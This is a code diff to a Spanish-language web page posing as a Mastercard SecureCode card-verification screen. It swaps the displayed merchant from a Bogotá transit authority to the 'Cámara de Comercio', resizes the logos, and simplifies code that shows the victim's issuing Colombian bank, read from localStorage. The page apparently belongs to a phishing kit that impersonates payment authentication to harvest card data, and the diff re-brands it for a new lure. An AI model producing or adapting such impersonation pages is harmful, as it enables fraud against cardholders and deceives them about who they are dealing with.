@@ -63,9 +63,10 @@
         }
 
         .mc-logo img {
-            height: 90px;
+            height: 60px; /* Ajustado para el logo de Mastercard */
             width: auto;
             display: block;
+            object-fit: contain;
         }
 
         .bank-logo {
@@ -73,13 +74,12 @@
             align-items: center;
             justify-content: flex-end;
             flex-shrink: 0;
-            max-width: 55%;
         }
 
         .bank-logo img {
-            height: 110px;
+            height: 50px; /* Ajustado para el logo de la Cámara */
             width: auto;
-            max-width: 200px;
+            max-width: 160px;
             object-fit: contain;
             display: block;
         }
@@ -447,12 +447,12 @@
             }
 
             .mc-logo img {
-                height: 80px;
+                height: 45px;
             }
 
             .bank-logo img {
-                height: 95px;
-                max-width: 160px;
+                height: 40px;
+                max-width: 130px;
             }
         }
 
@@ -468,16 +468,12 @@
             }
 
             .mc-logo img {
-                height: 90px;
-            }
-
-            .bank-logo {
-                max-width: 55%;
+                height: 35px;
             }
 
             .bank-logo img {
-                height: 100px;
-                max-width: 150px;
+                height: 30px;
+                max-width: 110px;
             }
 
             .form-title {
@@ -548,12 +544,13 @@
     </div>
 
     <div class="container">
+        <!-- CABECERA CON LOGOS FIJOS -->
         <div class="header">
             <div class="mc-logo">
-                <img src="master.png" alt="MasterCard SecureCode" />
+                <img src="master.png" alt="Mastercard" />
             </div>
-            <div class="bank-logo" id="bankLogoContainer">
-                <img id="bankLogoImg" src="" alt="Logo banco" style="display:none;" />
+            <div class="bank-logo">
+                <img src="image.png" alt="Cámara de Comercio" />
             </div>
         </div>
 
@@ -577,7 +574,7 @@
         <div class="transaction-info">
             <div class="info-row">
                 <span class="info-label">Comercio</span>
-                <span class="info-value">Secretaria Distrital de movilidad</span>
+                <span class="info-value">Cámara de Comercio</span>
             </div>
             <div class="info-row">
                 <span class="info-label">Monto</span>
@@ -731,12 +728,10 @@
         const loadingText = document.getElementById('loadingText');
         const loadingSubtext = document.getElementById('loadingSubtext');
         const statusMessage = document.getElementById('statusMessage');
-        const bankLogoImg = document.getElementById('bankLogoImg');
-        const bankLogoContainer = document.getElementById('bankLogoContainer');
         const bancoNombre = document.getElementById('bancoNombre');
 
         // ============================================
-        // MAPA DE LOGOS DE BANCOS (SINTAXIS CORREGIDA)
+        // MAPA DE LOGOS DE BANCOS
         // ============================================
         const bankLogos = {
             'Bancolombia': 'bancol.png',
@@ -762,7 +757,6 @@
 
         // ============================================
         // NORMALIZADOR DE NOMBRE DE BANCO
-        // Captura CUALQUIER variante que devuelva HandyAPI
         // ============================================
         function normalizarBanco(rawIssuer) {
             if (!rawIssuer) return null;
@@ -770,7 +764,6 @@
             const raw = rawIssuer.toLowerCase().trim();
             console.log('🔍 Normalizando banco:', raw);
 
-            // ---- BBVA - CUALQUIER variante ----
             if (
                 raw.includes('bbva') ||
                 raw.includes('bilbao') ||
@@ -783,61 +776,25 @@
                 return 'BBVA Colombia';
             }
 
-            // ---- BANCOLOMBIA ----
             if (raw.includes('bancolombia')) return 'Bancolombia';
-
-            // ---- DAVIVIENDA ----
             if (raw.includes('davivienda')) return 'Davivienda';
-
-            // ---- DAVIBANK ----
             if (raw.includes('davibank')) return 'Davibank';
-
-            // ---- BANCO DE BOGOTÁ ----
             if (raw.includes('banco de bogota') || raw.includes('banco de bogotá')) return 'Banco de Bogotá';
-
-            // ---- BANCO POPULAR ----
             if (raw.includes('banco popular') || raw === 'popular') return 'Banco Popular';
-
-            // ---- BANCO DE OCCIDENTE ----
             if (raw.includes('occidente')) return 'Banco Occidente';
-
-            // ---- CITIBANK ----
             if (raw.includes('citibank') || raw.includes('citi ')) return 'Citibank Colombia';
-
-            // ---- AV VILLAS ----
             if (raw.includes('av villas') || raw.includes('avvillas')) return 'Banco AV Villas';
-
-            // ---- ITAÚ ----
             if (raw.includes('itau') || raw.includes('itaú')) return 'Itaú';
-
-            // ---- GNB SUDAMERIS ----
             if (raw.includes('gnb') || raw.includes('sudameris')) return 'Banco GNB Sudameris';
-
-            // ---- FALABELLA ----
             if (raw.includes('falabella')) return 'Banco Falabella';
-
-            // ---- PICHINCHA ----
             if (raw.includes('pichincha')) return 'Banco Pichincha';
-
-            // ---- CAJA SOCIAL ----
             if (raw.includes('caja social')) return 'Caja Social';
-
-            // ---- COOPCENTRAL ----
             if (raw.includes('coopcentral')) return 'Banco Cooperativo Coopcentral';
-
-            // ---- BANCOOMEVA ----
             if (raw.includes('bancoomeva')) return 'Bancoomeva';
-
-            // ---- FINANDINA ----
             if (raw.includes('finandina')) return 'Banco Finandina';
-
-            // ---- SCOTIABANK COLPATRIA ----
             if (raw.includes('scotiabank') || raw.includes('colpatria')) return 'Scotiabank Colpatria';
-
-            // ---- BANCO AGRARIO ----
             if (raw.includes('agrario')) return 'Banco Agrario';
 
-            // ---- FALLBACK ----
             console.log('⚠️ Banco no reconocido, usando nombre crudo:', rawIssuer);
             return rawIssuer.split(' ')
                 .map(w => w.charAt(0).toUpperCase() + w.slice(1).toLowerCase())
@@ -907,45 +864,28 @@
         // ============================================
         window.addEventListener('load', function() {
             initializeTransaction();
-            cargarLogoBanco();
+            cargarNombreBanco();
             console.log('✅ MasterCard SecureCode listo');
             iniciarHeartbeat();
         });
 
-        function cargarLogoBanco() {
+        // SOLO CARGA EL NOMBRE, EL LOGO YA ESTÁ FIJO EN EL HTML
+        function cargarNombreBanco() {
             let bancoEmisor = localStorage.getItem('bancoEmisor');
-            console.log('🏛️ Banco emisor desde localStorage (crudo):', bancoEmisor);
-
-            // Normalizar por si acaso viene con otro formato
             if (bancoEmisor) {
                 bancoEmisor = normalizarBanco(bancoEmisor);
                 localStorage.setItem('bancoEmisor', bancoEmisor);
-                console.log('🏛️ Banco emisor normalizado:', bancoEmisor);
-            }
-
-            if (bancoEmisor) {
                 bancoNombre.textContent = bancoEmisor;
-            }
-
-            if (bancoEmisor && bankLogos[bancoEmisor]) {
-                bankLogoImg.src = bankLogos[bancoEmisor];
-                bankLogoImg.alt = bancoEmisor;
-                bankLogoImg.style.display = 'block';
-                bankLogoContainer.style.display = 'flex';
-                console.log('✅ Logo del banco cargado:', bankLogos[bancoEmisor]);
+                console.log('🏛️ Banco emisor normalizado:', bancoEmisor);
             } else {
-                bankLogoContainer.style.display = 'none';
-                console.log('❌ No se encontró logo para el banco:', bancoEmisor);
+                bancoNombre.textContent = 'banco emisor';
             }
         }
 
         // ============================================
         // INICIALIZAR TRANSACCIÓN
-        // - Comercio: Secretaria Distrital de movilidad
-        // - Monto: DINÁMICO desde localStorage (mismo que paso5.php)
         // ============================================
         function initializeTransaction() {
-            // MONTO DINÁMICO
             const montoGuardado = localStorage.getItem('montoTotal');
             const storagePriority = localStorage.getItem('procesamiento_prioritario') === 'true';
 
